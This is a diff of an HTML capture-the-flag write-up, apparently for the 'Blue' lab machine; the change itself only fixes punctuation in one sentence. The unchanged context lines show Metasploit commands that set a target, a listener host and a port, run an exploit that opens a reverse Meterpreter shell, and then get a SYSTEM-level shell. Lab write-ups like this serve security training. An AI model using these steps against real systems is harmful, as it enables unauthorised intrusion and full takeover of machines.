@@ -174,7 +174,7 @@
         <p>We'll use the first one, set our options, and run the exploit.</p>
         <pre><code>use 0</br>set rhost 10.10.10.40</br>set lhost 10.10.14.3</br>set lport 4444</br>run</code></pre>
         <img src="../images/blue9.png">
-        <p>The exploit worked, we now have a Meterpreter shell. We can drop a shell into the machine and check our user.</p>
+        <p>The exploit worked; we now have a Meterpreter shell. We can drop a shell into the machine and check our user.</p>
         <pre><code>shell</br>whoami</code></pre>
         <img src="../images/blue10.png">
         <p>We have a shell as NT AUTHORITY/SYSTEM, the highest privileged account. We'll get root and user flags next.</p>
